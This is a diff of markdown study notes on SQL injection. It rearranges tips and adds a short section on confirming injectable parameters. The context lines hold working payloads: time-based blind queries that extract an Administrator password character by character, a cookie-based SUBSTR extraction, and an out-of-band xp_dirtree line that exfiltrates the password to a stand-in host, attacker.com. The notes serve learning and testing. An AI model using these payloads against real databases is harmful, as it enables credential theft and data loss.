@@ -14,11 +14,6 @@
 * Trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
 * OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.
 
-**SQL injection in different parts of the query**
-
-* Most SQL injection vulnerabilities occur within the `WHERE` clause of a `SELECT` query.
-* However, SQL injection vulnerabilities can occur at any location (UPDATE, INSERT, SELECT \[column, table], ORDER BY)
-
 **Warning: OR 1=1**
 
 * If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.
@@ -28,10 +23,6 @@
 * Example:
   * Oracle: every `SELECT` query must use the `FROM` keyword and specify a valid table
   * MySQL: the double-dash sequence must be followed by a space
-
-**Encode payload in the cookie**
-
-* Remember that you can encode also in the cookie value. This may be useful with payload that use `;`.
 
 ## SQL injection UNION attacks
 
@@ -188,8 +179,7 @@ Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (SUBSTR((SELECT password FROM us
 
 * The first does not trigger a delay (false), the second does (true)
 * We can retrieve data by testing one character at a time
-* `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`\
-
+* `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
 
 ### Out-Of-Band (OAST) SQL injection
 
@@ -203,3 +193,15 @@ An application might carry out a SQL query asynchronously (another thread execut
 # Exfiltrate data
 '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.attacker.com/a"')--
 ```
+
+## Small tips
+
+* Sometimes when you try to break syntax you receive a response that does not indicate the parameter is vulnerable. **Build a query that provides a response indicating the parameter is vulnerable** ... Example:
+  * &#x20;`/stockcheck?productID=1` and the response tell you 3 units (stock check)
+  * `/stockcheck?productID='` and the response tell you 0 units ... in all case that you break...
+  * &#x20;`/stockcheck?productID=1 OR 1=1` the response give you units for all product...
+* Don't always use `'` to check. Similar to the above case, it would be pointless
+  * `/stockcheck?productID=1` . You know that exists a productID=2? Ok, try to inject `1+1` (instead of `1 OR 1=1` that it can be dangerous).
+* Remember that you can encode also in the cookie value. This may be useful with payload that use `;`.
+*   Remember that SQL injection vulnerabilities can occur at any location (UPDATE, INSERT, SELECT \[column, table], ORDER BY)
+
